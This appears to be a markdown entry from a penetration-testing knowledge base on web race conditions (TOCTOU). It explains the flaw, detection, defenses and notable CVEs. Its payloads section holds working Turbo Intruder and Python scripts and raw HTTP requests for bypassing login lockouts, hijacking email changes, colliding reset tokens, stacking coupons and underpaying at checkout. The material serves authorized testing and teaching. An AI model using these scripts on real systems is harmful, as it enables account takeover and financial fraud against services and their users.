# Race Conditions

> Concurrent requests hit a timing window to bypass limits or double-spend. **Deep dive:** [`Troubleshooting_Guide/race_condition.md`](../../../../Troubleshooting_Guide/race_condition.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Aliases / OWASP:** TOCTOU · A04:2021
**Status:** complete

## What it is
A race condition arises when an application assumes a sequence of operations runs atomically, but
concurrent requests slip between them. The classic shape is a TOCTOU (time-of-check to time-of-use)
flaw, where the gap between validating a state and acting on it becomes an exploitable window.

## How it works
The attacker controls request timing and sends many requests in parallel so they all land inside the
window between a read/validate step and the write/commit step. Because the app checks a limit, counter,
or balance separately from updating it — without a lock, transaction, or atomic operation — each
concurrent request reads the same pre-update state and is approved before any of them commits. The bug
is in the lack of synchronization, not in any single request.

## Impact
Bypass of business-logic limits: redeem a single-use coupon many times, withdraw or transfer more than
a balance, defeat anti-bruteforce attempt counters, claim limited stock or one-per-user offers
repeatedly, or collide on a shared resource (e.g. a reused password-reset token). Severity ranges from
medium to high — often financial loss or authentication bypass — and is highly application-specific.

## How to detect
- Endpoints whose outcome depends on a count, balance, flag, or single-use token that is checked then
  mutated in two steps.
- Send the same request as a tight parallel burst (Burp "Send group in parallel", Turbo Intruder gates)
  and look for the action succeeding more times than the limit allows.
- Inconsistent results across runs, duplicate records, or off-by-N final state are the tells; the
  signal is non-deterministic, so repeat the burst several times.

## Exploitation (summary)
Identify a check-then-act endpoint, then fire duplicate requests simultaneously (single-packet attack
over HTTP/2, or a warmed connection to minimize jitter) so they collide inside the window. Multi-step
variants race two different endpoints — e.g. add an expensive item while checkout validates the cheap
total. See the Payloads section for the per-scenario techniques and tooling.

## Payloads & techniques

> Distilled from field payload references — for authorized testing only.

The core move is to fire multiple requests **simultaneously** (parallel), not sequentially, so they land inside the window between a **read/validate** step and a **write/execute** step. Tooling: Burp Repeater ("Send group in parallel"), Turbo Intruder (gate-based queuing), or Python with `asyncio`/`httpx`/`threading`.

### Situation → technique

| Situation | Race target | Technique |
|-----------|-------------|-----------|
| 3-attempt login lockout | Counter increment vs. credential check | Fire all guesses before the counter increments |
| Email change confirmation | Pending-email field vs. confirmation send | Two parallel changes, confirmation routes to attacker |
| Password reset | Token generation timestamp | Parallel resets for two users collide on one token |
| Registration email confirm | NULL token window | `token[]=` empty-array race against unset DB token |
| Single-use discount coupon | Validation vs. "mark used" | Many parallel applications all pass validation |
| Cart / checkout total | Cart contents vs. total calculation | Swap in expensive item during checkout window |

### Rate-limit bypass (login lockout)

Send every candidate password in one parallel burst so they all pass before the attempt counter increments.

Turbo Intruder:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    passwords = wordlists.clipboard
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    engine.openGate('1')

def handleResponse(req, interesting):
    table.add(req)
```

Python (`httpx` async, HTTP/2):
```python
import asyncio, httpx, threading

TARGET_URL = "https://target/login"
USERNAME = "carlos"
CSRF_TOKEN = "TOKEN"

async def send_login(client, pwd, results, lock):
    try:
        r = await client.post(TARGET_URL, data={
            "csrf": CSRF_TOKEN, "username": USERNAME, "password": pwd
        })
        with lock:
            results.append({"pwd": pwd, "status": r.status_code})
    except: pass

async def race_attack(passwords):
    results, lock = [], threading.Lock()
    async with httpx.AsyncClient(http2=True, timeout=30.0, verify=False) as client:
        tasks = [send_login(client, p, results, lock) for p in passwords]
        await asyncio.gather(*tasks)
    return results

passwords = ["123456", "password", "qwerty", "12345678"]
print([r for r in asyncio.run(race_attack(passwords)) if r["status"] == 302])
```

### Email-change race

Two parallel change-email requests carrying different addresses; the confirmation email for the victim address can be dispatched to the attacker address.
```http
POST /my-account/change-email HTTP/2
Host: target.com
Cookie: session=YOUR_SESSION
Content-Type: application/x-www-form-urlencoded

email=attacker@evil.com
```
```http
POST /my-account/change-email HTTP/2
Host: target.com
Cookie: session=YOUR_SESSION
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

### Password-reset token collision

Parallel reset requests for two users (separate sessions) may generate identical tokens via a timestamp collision — use your token against the victim's username.
```http
POST /forgot-password HTTP/2
Cookie: phpsessionid=SESSION1

username=wiener
```
```http
POST /forgot-password HTTP/2
Cookie: phpsessionid=SESSION2

username=carlos
```

### Registration confirmation bypass (NULL token race)

During registration the token field is briefly NULL. Racing a flood of `token[]=` (empty array) confirmations against the registration matches the unset DB value.
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2)

    confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: target.com
Cookie: phpsessionid=SESSION_TOKEN
Content-Length: 0

'''
    for attempt in range(30):
        currentAttempt = str(attempt)
        username = 'User' + currentAttempt
        engine.queue(target.req, username, gate=currentAttempt)
        for i in range(50):
            engine.queue(confirmationReq, gate=currentAttempt)
        engine.openGate(currentAttempt)

def handleResponse(req, interesting):
    table.add(req)
```
Key payload: `POST /confirm?token[]= HTTP/2`.

### Single-use coupon over-application

Duplicate the coupon request ~20 times and send all in parallel; every request passes validation before any marks the coupon used, stacking the discount.
```http
POST /cart/coupon HTTP/2
Host: target.com
Cookie: session=YOUR_SESSION
Content-Type: application/x-www-form-urlencoded

coupon=PROMO20
```

### Multi-endpoint cart race (buy expensive item cheaply)

With a cheap item in the cart, race an add-expensive-item request against checkout so checkout validates the cheap total while the expensive item lands inside the window.
```http
POST /cart HTTP/2
Host: target.com
Cookie: session=YOUR_SESSION
Content-Type: application/x-www-form-urlencoded

productId=EXPENSIVE_ITEM_ID&redir=PRODUCT&quantity=1
```
```http
POST /cart/checkout HTTP/2
Host: target.com
Cookie: session=YOUR_SESSION
Content-Type: application/x-www-form-urlencoded

csrf=YOUR_CSRF_TOKEN
```
Turbo Intruder (two-endpoint gate):
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            requestsPerConnection=100,
                            pipeline=False,
                            engine=Engine.BURP2)

    addItem = '''POST /cart HTTP/2
Host: target.com
Cookie: session=YOUR_SESSION
Content-Type: application/x-www-form-urlencoded

productId=EXPENSIVE_ITEM&redir=PRODUCT&quantity=1'''

    checkout = '''POST /cart/checkout HTTP/2
Host: target.com
Cookie: session=YOUR_SESSION
Content-Type: application/x-www-form-urlencoded

csrf=YOUR_CSRF'''

    for attempt in range(20):
        engine.queue(addItem, gate='race1')
        engine.queue(checkout, gate='race1')
        engine.openGate('race1')
        time.sleep(0.1)

def handleResponse(req, interesting):
    table.add(req)
```
Python equivalent with `threading`:
```python
import requests, threading, time

BASE_URL = "https://target"
SESSION = requests.Session()
SESSION.cookies.set("session", "YOUR_SESSION")

def add_expensive_item():
    SESSION.post(f"{BASE_URL}/cart", data={
        "productId": "1", "redir": "PRODUCT", "quantity": "1"})

def checkout():
    SESSION.post(f"{BASE_URL}/cart/checkout", data={"csrf": "YOUR_CSRF"})

for _ in range(30):
    t1 = threading.Thread(target=add_expensive_item)
    t2 = threading.Thread(target=checkout)
    t1.start(); t2.start(); t1.join(); t2.join()
    time.sleep(0.1)
```

### Connection warming (Burp Repeater)

Eliminate network jitter so the race requests land tightly together:
```text
Tab 1: GET /                  (connection warmer — ignore response)
Tab 2: POST /cart             (add expensive item)
Tab 3: POST /cart/checkout    (checkout)

Select Tab 1–3 → "Send group in sequence (single connection)"
Then select Tab 2–3 → "Send group in parallel"
```

## Defenses
1. **Make the check-and-act atomic** — perform validation and mutation in a single database
   transaction with appropriate isolation, or via an atomic operation (`UPDATE ... WHERE balance >= x`,
   compare-and-swap, `INCR`).
2. **Lock the contended resource** — row/record locks (`SELECT ... FOR UPDATE`), application mutexes,
   or distributed locks keyed on the user/resource for the duration of the operation.
3. **Enforce uniqueness in the store** — a unique constraint (e.g. one redemption per user/coupon)
   lets the database reject the duplicate even under concurrency.
4. **Idempotency keys** for sensitive actions so replayed/parallel requests collapse to one effect.
5. Avoid splitting a single logical operation across multiple requests/endpoints that share mutable
   state without coordination.

## Finding CVEs from scratch
- **NVD** — https://nvd.nist.gov/vuln/search?query=Race+Conditions
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=Race+Conditions
- **Exploit-DB** — https://www.exploit-db.com/search?q=Race+Conditions
- **GitHub Advisories** — https://github.com/advisories?query=Race+Conditions
- **OSV** — https://osv.dev/list?q=Race+Conditions
- **Community** — r/netsec, vendor security blogs, HackerOne Hacktivity, X/Twitter infosec.
- _Query tip: add the target product + version, e.g. `Race Conditions <product> <version>`._

## Notable CVEs
_Illustrative — verify against NVD before relying on details._
- `CVE-2016-5195` — "Dirty COW": a Linux kernel copy-on-write race enabling local privilege escalation.
- `CVE-2019-11043` — PHP-FPM/Nginx race (env_path_info underflow) leading to remote code execution.
- _Canonical web incident: PortSwigger's "limit overrun" research showed single-packet HTTP/2 attacks
  redeeming gift cards and bypassing rate limits on multiple production sites._

## References
- PortSwigger Web Security Academy — Race conditions.
- OWASP — Testing for Race Conditions (WSTG-BUSL-08); Cheat Sheet on concurrency/locking.
- James Kettle, "Smashing the state machine: the true potential of web race conditions" (PortSwigger Research).
